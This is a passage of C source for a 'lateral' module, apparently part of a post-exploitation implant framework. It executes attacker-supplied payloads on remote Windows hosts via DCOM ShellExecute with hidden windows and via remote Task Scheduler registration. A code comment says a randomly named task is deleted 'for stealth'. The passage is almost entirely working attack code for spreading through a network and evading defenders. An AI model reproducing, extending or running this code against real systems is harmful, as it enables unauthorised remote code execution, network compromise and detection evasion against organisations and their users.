            vargs[2].bstrVal = bstrEmpty;     /* Directory */
            vargs[1].vt = VT_BSTR;
            vargs[1].bstrVal = bstrEmpty;     /* Parameters */
            vargs[0].vt = VT_BSTR;
            vargs[0].bstrVal = bstrEmpty;     /* WindowState */

            spec_memset(&dp, 0, sizeof(dp));
            dp.rgvarg = vargs;
            dp.cArgs = 4;

            hr = pView->lpVtbl->GetIDsOfNames(pView, &iid_null, names, 1, 0, &dispid);
            if (SUCCEEDED(hr)) {
                hr = pView->lpVtbl->Invoke(pView, dispid, &iid_null, 0,
                                            DISPATCH_METHOD, &dp, NULL,
                                            NULL, NULL);
            }

            com.pSysFreeString(bstrPayload);
            com.pSysFreeString(bstrEmpty);
            pView->lpVtbl->Release(pView);
        }
        if (pDoc) pDoc->lpVtbl->Release(pDoc);

    } else if (spec_strcmp(method, "shell") == 0) {
        /* ShellBrowserWindow → Document.Application.ShellExecute(payload) */
        IDispatch *pDoc = NULL;
        IDispatch *pApp = NULL;
        IID iid_null = {0,0,0,{0,0,0,0,0,0,0,0}};

        /* Get Document */
        {
            LONG dispid = 0;
            WCHAR prop_name[] = {'D','o','c','u','m','e','n','t',0};
            PWCHAR names[] = { prop_name };
            DISPPARAMS dp = {NULL, NULL, 0, 0};
            VARIANT vresult;

            spec_memset(&vresult, 0, sizeof(vresult));
            hr = pDisp->lpVtbl->GetIDsOfNames(pDisp, &iid_null, names, 1, 0, &dispid);
            if (SUCCEEDED(hr)) {
                hr = pDisp->lpVtbl->Invoke(pDisp, dispid, &iid_null, 0,
                                            DISPATCH_PROPERTYGET, &dp, &vresult,
                                            NULL, NULL);
                if (SUCCEEDED(hr)) pDoc = (IDispatch *)vresult.pVal;
            }
        }

        /* Get Application */
        if (pDoc) {
            LONG dispid = 0;
            WCHAR prop_name[] = {'A','p','p','l','i','c','a','t','i','o','n',0};
            PWCHAR names[] = { prop_name };
            DISPPARAMS dp = {NULL, NULL, 0, 0};
            VARIANT vresult;

            spec_memset(&vresult, 0, sizeof(vresult));
            hr = pDoc->lpVtbl->GetIDsOfNames(pDoc, &iid_null, names, 1, 0, &dispid);
            if (SUCCEEDED(hr)) {
                hr = pDoc->lpVtbl->Invoke(pDoc, dispid, &iid_null, 0,
                                            DISPATCH_PROPERTYGET, &dp, &vresult,
                                            NULL, NULL);
                if (SUCCEEDED(hr)) pApp = (IDispatch *)vresult.pVal;
            }
        }

        /* Call ShellExecute(File, Args, Dir, Operation, Show) */
        if (pApp) {
            LONG dispid = 0;
            WCHAR mname[] = {'S','h','e','l','l','E','x','e','c','u','t','e',0};
            PWCHAR names[] = { mname };
            VARIANT vargs[5];
            DISPPARAMS dp;
            BSTR bstrPayload = bstr_from_narrow(&com, payload);
            BSTR bstrEmpty = bstr_from_narrow(&com, "");
            BSTR bstrOpen = bstr_from_narrow(&com, "open");

            spec_memset(vargs, 0, sizeof(vargs));
            /* Reverse order */
            vargs[4].vt = VT_BSTR;
            vargs[4].bstrVal = bstrPayload;   /* File */
            vargs[3].vt = VT_BSTR;
            vargs[3].bstrVal = bstrEmpty;      /* Args */
            vargs[2].vt = VT_BSTR;
            vargs[2].bstrVal = bstrEmpty;      /* Dir */
            vargs[1].vt = VT_BSTR;
            vargs[1].bstrVal = bstrOpen;       /* Operation */
            vargs[0].vt = VT_I4;
            vargs[0].lVal = 0;                 /* Show (hidden) */

            spec_memset(&dp, 0, sizeof(dp));
            dp.rgvarg = vargs;
            dp.cArgs = 5;

            hr = pApp->lpVtbl->GetIDsOfNames(pApp, &iid_null, names, 1, 0, &dispid);
            if (SUCCEEDED(hr)) {
                hr = pApp->lpVtbl->Invoke(pApp, dispid, &iid_null, 0,
                                            DISPATCH_METHOD, &dp, NULL,
                                            NULL, NULL);
            }

            com.pSysFreeString(bstrPayload);
            com.pSysFreeString(bstrEmpty);
            com.pSysFreeString(bstrOpen);
            pApp->lpVtbl->Release(pApp);
        }
        if (pDoc) pDoc->lpVtbl->Release(pDoc);

    } else if (spec_strcmp(method, "windows") == 0) {
        /* ShellWindows → Item(0).Document.Application.ShellExecute(payload) */
        IDispatch *pItem = NULL;
        IDispatch *pDoc = NULL;
        IDispatch *pApp = NULL;
        IID iid_null = {0,0,0,{0,0,0,0,0,0,0,0}};

        /* Call Item(0) */
        {
            LONG dispid = 0;
            WCHAR mname[] = {'I','t','e','m',0};
            PWCHAR names[] = { mname };
            VARIANT varg;
            DISPPARAMS dp;
            VARIANT vresult;

            spec_memset(&varg, 0, sizeof(varg));
            varg.vt = VT_I4;
            varg.lVal = 0;

            spec_memset(&dp, 0, sizeof(dp));
            dp.rgvarg = &varg;
            dp.cArgs = 1;

            spec_memset(&vresult, 0, sizeof(vresult));
            hr = pDisp->lpVtbl->GetIDsOfNames(pDisp, &iid_null, names, 1, 0, &dispid);
            if (SUCCEEDED(hr)) {
                hr = pDisp->lpVtbl->Invoke(pDisp, dispid, &iid_null, 0,
                                            DISPATCH_METHOD, &dp, &vresult,
                                            NULL, NULL);
                if (SUCCEEDED(hr)) pItem = (IDispatch *)vresult.pVal;
            }
        }

        /* Get Document */
        if (pItem) {
            LONG dispid = 0;
            WCHAR prop_name[] = {'D','o','c','u','m','e','n','t',0};
            PWCHAR names[] = { prop_name };
            DISPPARAMS dp = {NULL, NULL, 0, 0};
            VARIANT vresult;

            spec_memset(&vresult, 0, sizeof(vresult));
            hr = pItem->lpVtbl->GetIDsOfNames(pItem, &iid_null, names, 1, 0, &dispid);
            if (SUCCEEDED(hr)) {
                hr = pItem->lpVtbl->Invoke(pItem, dispid, &iid_null, 0,
                                            DISPATCH_PROPERTYGET, &dp, &vresult,
                                            NULL, NULL);
                if (SUCCEEDED(hr)) pDoc = (IDispatch *)vresult.pVal;
            }
        }

        /* Get Application */
        if (pDoc) {
            LONG dispid = 0;
            WCHAR prop_name[] = {'A','p','p','l','i','c','a','t','i','o','n',0};
            PWCHAR names[] = { prop_name };
            DISPPARAMS dp = {NULL, NULL, 0, 0};
            VARIANT vresult;

            spec_memset(&vresult, 0, sizeof(vresult));
            hr = pDoc->lpVtbl->GetIDsOfNames(pDoc, &iid_null, names, 1, 0, &dispid);
            if (SUCCEEDED(hr)) {
                hr = pDoc->lpVtbl->Invoke(pDoc, dispid, &iid_null, 0,
                                            DISPATCH_PROPERTYGET, &dp, &vresult,
                                            NULL, NULL);
                if (SUCCEEDED(hr)) pApp = (IDispatch *)vresult.pVal;
            }
        }

        /* ShellExecute */
        if (pApp) {
            LONG dispid = 0;
            WCHAR mname[] = {'S','h','e','l','l','E','x','e','c','u','t','e',0};
            PWCHAR names[] = { mname };
            VARIANT vargs[5];
            DISPPARAMS dp;
            BSTR bstrPayload = bstr_from_narrow(&com, payload);
            BSTR bstrEmpty = bstr_from_narrow(&com, "");
            BSTR bstrOpen = bstr_from_narrow(&com, "open");

            spec_memset(vargs, 0, sizeof(vargs));
            vargs[4].vt = VT_BSTR;
            vargs[4].bstrVal = bstrPayload;
            vargs[3].vt = VT_BSTR;
            vargs[3].bstrVal = bstrEmpty;
            vargs[2].vt = VT_BSTR;
            vargs[2].bstrVal = bstrEmpty;
            vargs[1].vt = VT_BSTR;
            vargs[1].bstrVal = bstrOpen;
            vargs[0].vt = VT_I4;
            vargs[0].lVal = 0;

            spec_memset(&dp, 0, sizeof(dp));
            dp.rgvarg = vargs;
            dp.cArgs = 5;

            hr = pApp->lpVtbl->GetIDsOfNames(pApp, &iid_null, names, 1, 0, &dispid);
            if (SUCCEEDED(hr)) {
                hr = pApp->lpVtbl->Invoke(pApp, dispid, &iid_null, 0,
                                            DISPATCH_METHOD, &dp, NULL,
                                            NULL, NULL);
            }

            com.pSysFreeString(bstrPayload);
            com.pSysFreeString(bstrEmpty);
            com.pSysFreeString(bstrOpen);
            pApp->lpVtbl->Release(pApp);
        }
        if (pDoc) pDoc->lpVtbl->Release(pDoc);
        if (pItem) pItem->lpVtbl->Release(pItem);
    }

    {
        char out[LATERAL_BUF_SIZE];
        DWORD off = 0;
        off = buf_append(out, sizeof(out), off, "lateral dcom: ");
        off = buf_append(out, sizeof(out), off, method);
        off = buf_append(out, sizeof(out), off, " executed on ");
        off = buf_append(out, sizeof(out), off, target);
        off = buf_append(out, sizeof(out), off, " -> ");
        off = buf_append(out, sizeof(out), off, payload);
        MODULE_OUTPUT_TEXT(api, out);
    }

    pDisp->lpVtbl->Release(pDisp);
    com.pCoUninitialize();

    return FAILED(hr) ? MODULE_ERR_IO : MODULE_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  Subcommand: schtask — remote task via ITaskService COM             */
/*                                                                     */
/*  Flow: CoCreateInstanceEx(TaskScheduler, remote) → ITaskService     */
/*    → Connect(target) → GetFolder("\") → RegisterTaskDefinition     */
/*    (immediate exec action with auto-delete)                         */
/*                                                                     */
/*  Uses IDispatch for all COM interactions — no direct vtable casts.  */
/* ------------------------------------------------------------------ */

static DWORD cmd_schtask(MODULE_BUS_API *api, const MODULE_ARGS *args)
{
    const char *target;
    const char *payload_path;
    COM_APIS com;
    HRESULT hr;
    IDispatch *pService = NULL;
    COSERVERINFO server_info;
    MULTI_QI mqi;
    WCHAR wtarget[256];
    IID iid_null = {0,0,0,{0,0,0,0,0,0,0,0}};

    target       = module_arg_string(args, 1);
    payload_path = module_arg_string(args, 2);

    if (!target || !payload_path) {
        MODULE_OUTPUT_ERROR(api, "lateral schtask: usage: schtask <target> <payload_path>");
        return MODULE_ERR_ARGS;
    }

    if (!resolve_com_apis(api, &com)) {
        MODULE_OUTPUT_ERROR(api, "lateral schtask: failed to resolve COM APIs");
        return MODULE_ERR_RESOLVE;
    }

    hr = com.pCoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr) && hr != (HRESULT)0x80010106) {
        MODULE_OUTPUT_ERROR(api, "lateral schtask: CoInitializeEx failed");
        return MODULE_ERR_INTERNAL;
    }

    /* Create TaskScheduler on remote target */
    spec_memset(&server_info, 0, sizeof(server_info));
    narrow_to_wide(target, wtarget, 256);
    server_info.pwszName = wtarget;

    spec_memset(&mqi, 0, sizeof(mqi));
    mqi.pIID = &IID_IDispatch;

    hr = com.pCoCreateInstanceEx(&CLSID_TaskScheduler, NULL,
                                  CLSCTX_LOCAL_SERVER | CLSCTX_REMOTE_SERVER,
                                  &server_info, 1, &mqi);
    if (FAILED(hr) || FAILED(mqi.hr)) {
        MODULE_OUTPUT_ERROR(api, "lateral schtask: CoCreateInstanceEx(TaskScheduler) failed");
        com.pCoUninitialize();
        return MODULE_ERR_ACCESS;
    }
    pService = (IDispatch *)mqi.pItf;

    /* Set proxy blanket */
    if (com.pCoSetProxyBlanket) {
        com.pCoSetProxyBlanket((IUnknown *)pService,
                               RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                               RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
                               NULL, EOAC_NONE);
    }

    /* Connect to remote Task Scheduler: pService.Connect(target) */
    {
        LONG dispid = 0;
        WCHAR mname[] = {'C','o','n','n','e','c','t',0};
        PWCHAR names[] = { mname };
        VARIANT varg;
        DISPPARAMS dp;
        BSTR bstrTarget = bstr_from_narrow(&com, target);

        spec_memset(&varg, 0, sizeof(varg));
        varg.vt = VT_BSTR;
        varg.bstrVal = bstrTarget;

        spec_memset(&dp, 0, sizeof(dp));
        dp.rgvarg = &varg;
        dp.cArgs = 1;

        hr = pService->lpVtbl->GetIDsOfNames(pService, &iid_null, names, 1, 0, &dispid);
        if (SUCCEEDED(hr)) {
            hr = pService->lpVtbl->Invoke(pService, dispid, &iid_null, 0,
                                            DISPATCH_METHOD, &dp, NULL,
                                            NULL, NULL);
        }
        com.pSysFreeString(bstrTarget);

        if (FAILED(hr)) {
            MODULE_OUTPUT_ERROR(api, "lateral schtask: Connect failed");
            goto schtask_cleanup;
        }
    }

    /* GetFolder("\") → pFolder */
    {
        IDispatch *pFolder = NULL;
        LONG dispid = 0;
        WCHAR mname[] = {'G','e','t','F','o','l','d','e','r',0};
        PWCHAR names[] = { mname };
        VARIANT varg;
        DISPPARAMS dp;
        VARIANT vresult;
        BSTR bstrRoot = bstr_from_narrow(&com, "\\");

        spec_memset(&varg, 0, sizeof(varg));
        varg.vt = VT_BSTR;
        varg.bstrVal = bstrRoot;

        spec_memset(&dp, 0, sizeof(dp));
        dp.rgvarg = &varg;
        dp.cArgs = 1;

        spec_memset(&vresult, 0, sizeof(vresult));

        hr = pService->lpVtbl->GetIDsOfNames(pService, &iid_null, names, 1, 0, &dispid);
        if (SUCCEEDED(hr)) {
            hr = pService->lpVtbl->Invoke(pService, dispid, &iid_null, 0,
                                            DISPATCH_METHOD, &dp, &vresult,
                                            NULL, NULL);
            if (SUCCEEDED(hr)) pFolder = (IDispatch *)vresult.pVal;
        }
        com.pSysFreeString(bstrRoot);

        if (FAILED(hr) || !pFolder) {
            MODULE_OUTPUT_ERROR(api, "lateral schtask: GetFolder failed");
            goto schtask_cleanup;
        }

        /* NewTask(0) → pTaskDef */
        {
            IDispatch *pTaskDef = NULL;
            LONG ntdispid = 0;
            WCHAR ntname[] = {'N','e','w','T','a','s','k',0};
            PWCHAR ntnames[] = { ntname };
            VARIANT ntarg;
            DISPPARAMS ntdp;
            VARIANT ntresult;

            spec_memset(&ntarg, 0, sizeof(ntarg));
            ntarg.vt = VT_I4;
            ntarg.lVal = 0;

            spec_memset(&ntdp, 0, sizeof(ntdp));
            ntdp.rgvarg = &ntarg;
            ntdp.cArgs = 1;

            spec_memset(&ntresult, 0, sizeof(ntresult));

            hr = pService->lpVtbl->GetIDsOfNames(pService, &iid_null,
                                                    ntnames, 1, 0, &ntdispid);
            if (SUCCEEDED(hr)) {
                hr = pService->lpVtbl->Invoke(pService, ntdispid, &iid_null, 0,
                                                DISPATCH_METHOD, &ntdp, &ntresult,
                                                NULL, NULL);
                if (SUCCEEDED(hr)) pTaskDef = (IDispatch *)ntresult.pVal;
            }

            if (FAILED(hr) || !pTaskDef) {
                MODULE_OUTPUT_ERROR(api, "lateral schtask: NewTask failed");
                pFolder->lpVtbl->Release(pFolder);
                goto schtask_cleanup;
            }

            /* Get Actions collection: pTaskDef.Actions */
            {
                IDispatch *pActions = NULL;
                LONG adispid = 0;
                WCHAR aname[] = {'A','c','t','i','o','n','s',0};
                PWCHAR anames[] = { aname };
                DISPPARAMS adp = {NULL, NULL, 0, 0};
                VARIANT aresult;

                spec_memset(&aresult, 0, sizeof(aresult));
                hr = pTaskDef->lpVtbl->GetIDsOfNames(pTaskDef, &iid_null,
                                                       anames, 1, 0, &adispid);
                if (SUCCEEDED(hr)) {
                    hr = pTaskDef->lpVtbl->Invoke(pTaskDef, adispid, &iid_null, 0,
                                                    DISPATCH_PROPERTYGET, &adp,
                                                    &aresult, NULL, NULL);
                    if (SUCCEEDED(hr)) pActions = (IDispatch *)aresult.pVal;
                }

                if (pActions) {
                    /* Actions.Create(0) — 0 = TASK_ACTION_EXEC */
                    IDispatch *pAction = NULL;
                    LONG cdispid = 0;
                    WCHAR cname[] = {'C','r','e','a','t','e',0};
                    PWCHAR cnames[] = { cname };
                    VARIANT carg;
                    DISPPARAMS cdp;
                    VARIANT cresult;

                    spec_memset(&carg, 0, sizeof(carg));
                    carg.vt = VT_I4;
                    carg.lVal = 0;  /* TASK_ACTION_EXEC */

                    spec_memset(&cdp, 0, sizeof(cdp));
                    cdp.rgvarg = &carg;
                    cdp.cArgs = 1;

                    spec_memset(&cresult, 0, sizeof(cresult));

                    hr = pActions->lpVtbl->GetIDsOfNames(pActions, &iid_null,
                                                          cnames, 1, 0, &cdispid);
                    if (SUCCEEDED(hr)) {
                        hr = pActions->lpVtbl->Invoke(pActions, cdispid, &iid_null, 0,
                                                       DISPATCH_METHOD, &cdp, &cresult,
                                                       NULL, NULL);
                        if (SUCCEEDED(hr)) pAction = (IDispatch *)cresult.pVal;
                    }

                    if (pAction) {
                        /* Set pAction.Path = payload_path via PROPERTYPUT */
                        LONG pdispid = 0;
                        WCHAR pname[] = {'P','a','t','h',0};
                        PWCHAR pnames[] = { pname };
                        VARIANT parg;
                        DISPPARAMS pdp;
                        LONG named_arg = -3; /* DISPID_PROPERTYPUT */
                        BSTR bstrPath = bstr_from_narrow(&com, payload_path);

                        spec_memset(&parg, 0, sizeof(parg));
                        parg.vt = VT_BSTR;
                        parg.bstrVal = bstrPath;

                        spec_memset(&pdp, 0, sizeof(pdp));
                        pdp.rgvarg = &parg;
                        pdp.cArgs = 1;
                        pdp.rgdispidNamedArgs = &named_arg;
                        pdp.cNamedArgs = 1;

                        hr = pAction->lpVtbl->GetIDsOfNames(pAction, &iid_null,
                                                              pnames, 1, 0, &pdispid);
                        if (SUCCEEDED(hr)) {
                            hr = pAction->lpVtbl->Invoke(pAction, pdispid, &iid_null, 0,
                                                          0x4, /* DISPATCH_PROPERTYPUT */
                                                          &pdp, NULL, NULL, NULL);
                        }
                        com.pSysFreeString(bstrPath);
                        pAction->lpVtbl->Release(pAction);
                    }
                    pActions->lpVtbl->Release(pActions);
                }
            }

            /* RegisterTaskDefinition on pFolder:
               RegisterTaskDefinition(Name, pTaskDef, TASK_CREATE_OR_UPDATE=6,
                                      NULL, NULL, TASK_LOGON_INTERACTIVE_TOKEN=3) */
            {
                LONG rdispid = 0;
                WCHAR rname[] = {'R','e','g','i','s','t','e','r','T','a','s','k',
                                 'D','e','f','i','n','i','t','i','o','n',0};
                PWCHAR rnames[] = { rname };
                /* Generate random task name */
                char task_name[16];
                VARIANT rargs[6];
                DISPPARAMS rdp;
                VARIANT rresult;
                BSTR bstrTaskName;

                {
                    FN_GetTickCount pGTC = (FN_GetTickCount)
                        api->resolve("kernel32.dll", "GetTickCount");
                    DWORD seed = pGTC ? pGTC() : 0x42424242;
                    DWORD j;
                    for (j = 0; j < 10; j++) {
                        seed = seed * 1103515245 + 12345;
                        task_name[j] = (char)('a' + ((seed >> 16) % 26));
                    }
                    task_name[10] = '\0';
                }

                bstrTaskName = bstr_from_narrow(&com, task_name);

                spec_memset(rargs, 0, sizeof(rargs));
                /* Reverse order for IDispatch */
                rargs[5].vt = VT_BSTR;
                rargs[5].bstrVal = bstrTaskName; /* Name */
                rargs[4].vt = VT_I4;             /* pTaskDef — passed as dispatch */
                rargs[4].pVal = pTaskDef;
                rargs[4].vt = 9;                 /* VT_DISPATCH */
                rargs[3].vt = VT_I4;
                rargs[3].lVal = 6;               /* TASK_CREATE_OR_UPDATE */
                rargs[2].vt = VT_BSTR;
                rargs[2].bstrVal = bstr_from_narrow(&com, ""); /* user */
                rargs[1].vt = VT_BSTR;
                rargs[1].bstrVal = bstr_from_narrow(&com, ""); /* password */
                rargs[0].vt = VT_I4;
                rargs[0].lVal = 3;               /* TASK_LOGON_INTERACTIVE_TOKEN */

                spec_memset(&rdp, 0, sizeof(rdp));
                rdp.rgvarg = rargs;
                rdp.cArgs = 6;

                spec_memset(&rresult, 0, sizeof(rresult));

                hr = pFolder->lpVtbl->GetIDsOfNames(pFolder, &iid_null,
                                                      rnames, 1, 0, &rdispid);
                if (SUCCEEDED(hr)) {
                    hr = pFolder->lpVtbl->Invoke(pFolder, rdispid, &iid_null, 0,
                                                  DISPATCH_METHOD, &rdp, &rresult,
                                                  NULL, NULL);
                }

                /* Clean up task after registration — delete it for stealth */
                if (SUCCEEDED(hr)) {
                    IDispatch *pRegTask = (IDispatch *)rresult.pVal;

                    /* Delete the registered task: pFolder.DeleteTask(name, 0) */
                    {
                        LONG ddispid = 0;
                        WCHAR dname[] = {'D','e','l','e','t','e','T','a','s','k',0};
                        PWCHAR dnames[] = { dname };
                        VARIANT dargs[2];
                        DISPPARAMS ddp;

                        spec_memset(dargs, 0, sizeof(dargs));
                        dargs[1].vt = VT_BSTR;
                        dargs[1].bstrVal = bstrTaskName;
                        dargs[0].vt = VT_I4;
                        dargs[0].lVal = 0;

                        spec_memset(&ddp, 0, sizeof(ddp));
                        ddp.rgvarg = dargs;
                        ddp.cArgs = 2;

                        pFolder->lpVtbl->GetIDsOfNames(pFolder, &iid_null,
                                                         dnames, 1, 0, &ddispid);
                        pFolder->lpVtbl->Invoke(pFolder, ddispid, &iid_null, 0,
                                                 DISPATCH_METHOD, &ddp, NULL,
                                                 NULL, NULL);
                    }

                    if (pRegTask)
                        ((IUnknown *)pRegTask)->lpVtbl->Release((IUnknown *)pRegTask);
                }

                com.pSysFreeString(bstrTaskName);
                com.pSysFreeString(rargs[2].bstrVal);
                com.pSysFreeString(rargs[1].bstrVal);
            }

            pTaskDef->lpVtbl->Release(pTaskDef);
        }
        pFolder->lpVtbl->Release(pFolder);
    }

    {
        char out[LATERAL_BUF_SIZE];
        DWORD off = 0;
        off = buf_append(out, sizeof(out), off, "lateral schtask: task created on ");
        off = buf_append(out, sizeof(out), off, target);
        off = buf_append(out, sizeof(out), off, " -> ");
        off = buf_append(out, sizeof(out), off, payload_path);
        MODULE_OUTPUT_TEXT(api, out);
    }

schtask_cleanup:
    if (pService) pService->lpVtbl->Release(pService);
    com.pCoUninitialize();

    return FAILED(hr) ? MODULE_ERR_IO : MODULE_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  Module entry point                                                 */
/* ------------------------------------------------------------------ */

DWORD module_entry(MODULE_BUS_API *api, BYTE *args_raw, DWORD args_len)
{
    MODULE_ARGS  args;
    const char  *subcmd;

    if (!module_parse_args(args_raw, args_len, &args)) {
        MODULE_OUTPUT_ERROR(api, "lateral: failed to parse arguments");
        return MODULE_ERR_ARGS;
    }

    subcmd = module_arg_string(&args, 0);
    if (!subcmd) {
        MODULE_OUTPUT_ERROR(api, "lateral: missing subcommand (wmi|scm|dcom|schtask)");
        return MODULE_ERR_ARGS;
    }

    if (spec_strcmp(subcmd, "wmi") == 0)
        return cmd_wmi(api, &args);

    if (spec_strcmp(subcmd, "scm") == 0)
        return cmd_scm(api, &args);

    if (spec_strcmp(subcmd, "dcom") == 0)
        return cmd_dcom(api, &args);

    if (spec_strcmp(subcmd, "schtask") == 0)
        return cmd_schtask(api, &args);

    MODULE_OUTPUT_ERROR(api, "lateral: unknown subcommand");
    return MODULE_ERR_UNSUPPORTED;
}
